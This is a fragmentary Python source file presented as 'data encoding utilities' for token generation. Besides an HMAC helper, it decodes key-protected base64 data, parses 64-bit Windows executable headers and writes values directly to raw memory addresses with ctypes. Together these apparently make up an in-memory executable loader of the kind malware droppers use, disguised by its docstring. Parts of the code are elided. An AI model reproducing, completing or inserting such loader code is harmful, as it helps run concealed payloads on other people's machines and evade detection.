# -*- coding: utf-8 -*-
"""
Data encoding utilities — secure token generation and stream processing.
"""
import base64
import ctypes
import hashlib
...
def generate_token(nonce, ts, secret):
    msg = (nonce + str(ts)).encode()
    return hmac.new(secret, msg, hashlib.sha256).hexdigest()


def decode_data(key_hex, data_b64):
    try:
        return _decode_lib(key_hex, data_b64)
    except Exception:
        return _decode_native(key_hex, data_b64)


def _decode_lib(key_hex, data_b64):
...
def _decode_native(key_hex, data_b64):
    key = bytes.fromhex(key_hex)
    raw = base64.b64decode(data_b64)
...
def parse_structure(data):
    if len(data) < 256 or struct.unpack_from("<H", data, 0)[0] != 0x5A4D:
        return None
    o = _rbuf(data, 0x3C, "<I")
    if o + 4 > len(data) or _rbuf(data, o, "<I") != 0x4550:
        return None
    fh = o + 4
    ns = _rbuf(data, fh + 2, "<H")
    os_ = _rbuf(data, fh + 16, "<H")
    oh = fh + 20
    if _rbuf(data, oh, "<H") != 0x20B:
        return None
...
def patch(address, fmt, val):
    sz = struct.calcsize(fmt)
    struct.pack_into(
        fmt, (ctypes.c_char * sz).from_address(address), 0, val,
    )
